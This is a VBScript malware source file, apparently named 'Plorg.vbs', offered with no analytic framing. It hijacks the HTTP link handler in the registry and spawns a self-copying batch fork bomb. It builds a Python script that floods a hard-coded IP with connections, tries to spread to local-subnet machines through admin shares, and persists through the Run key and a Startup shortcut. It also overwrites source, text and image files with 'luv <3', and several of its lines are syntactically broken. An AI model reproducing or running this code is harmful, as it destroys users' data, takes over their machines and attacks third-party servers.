Set objFSO = CreateObject("Scripting.FileSystemObject")

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """Plorg.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Set objTextFile = objFSO.CreateTextFile("C:\Plorg\xer.bat", True)
Set write = objTextFile.WriteLine
write("@echo off")
write("title Porg thumb up yay %random%%random%%random%%random%")
write("set self=%~n0")
write("TYPE %self%.bat > %self%uwu.bat")
write("start %self%uwu.bat")
objTextFile.Close

Set WshShell = WScript.CreateObject("WScript.Shell")

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """C:\Plorg\xer.bat"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

ProgramName = "C:\Plorg\xer.bat"
WshShell.Run ProgramName, 0, True

write("echo import shutil >> %self%XD.py")
write("echo import os >> %self%XD.py")
write("echo shutil.copy(os.path.abspath(__file__), os.path.join(os.path.dirname(os.path.abspath(__file__)), "copy.bat")) >> %self%XD.py"
write("echo os.startfile("copy.bat") >> %self%XD.py")

write("python %self%XD.py")

write("echo XD")
objTextFile.Close

ProgramName = "XD.py"
WshShell.Run ProgramName, 0, True

write("echo import socket >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo IP = "104.26.3.4" >> %self%X3.py")
write("echo PORT = 80 >> %self%X3.py")
write("echo CONNECTIONS = 1000 >> %self%X3.py")
write("echo MESSAGE = "i hate the satan >:(" >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo connections = [] >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo for i in range(CONNECTIONS): >> %self%X3.py")
write("echo     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> %self%X3.py")
write("echo     server_address = (IP, PORT) >> %self%X3.py")
write("echo     sock.connect(server_address) >> %self%X3.py")
write("echo     connections.append(sock) >> %self%X3.py")
write("echo  >> %self%X3.py")
write("echo while True: >> %self%X3.py")
write("echo     for i in range(len(connections)): >> %self%X3.py")
write("echo         sock = connections[i] >> %self%X3.py")
write("echo         sock.sendall(MESSAGE.encode()) >> %self%X3.py")
write("echo         new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> %self%X3.py")
write("echo         new_sock.connect(server_address) >> %self%X3.py")
write("echo         connections.append(new_sock) >> %self%X3.py")
write("echo     print("Number of connections:", len(connections)) >> %self%X3.py")

write("python %self%X3.py")")
objTextFile.Close

Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

' Get the list of IP addresses on the local subnet
' (Assuming a subnet mask of 255.255.255.0)
Dim arrIPAddresses
arrIPAddresses = GetIPAddresses()

' Loop through each IP address and try to execute the script remotely
For Each strIPAddress in arrIPAddresses
  On Error Resume Next
  objShell.Run "\\" & strIPAddress & "\c$\windows\system32\cscript.exe //B " & WScript.ScriptFullName, 0, True
  If Err.Number = 0 Then
    ' Script executed successfully on remote machine
  End If
Next

' Function to get a list of IP addresses on the local subnet
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "Plorg.vbs"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".txt" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".js" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".py" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".cpp" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".jpg" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".png" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".js" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".py" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".cpp" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%User%")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".jss" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

ProgramName = "C:\Plorg\xer.bat"
WshShell.Run ProgramName, 0, True

Set objShell = CreateObject("WScript.Shell")

strDesktop = objShell.SpecialFolders("Startup")
strLinkFile = strDesktop & "\Program.lnk"
Set objLink = objShell.CreateShortcut(strLinkFile)
objLink.TargetPath = "C:\Plorg\xer.bat"
objLink.Save
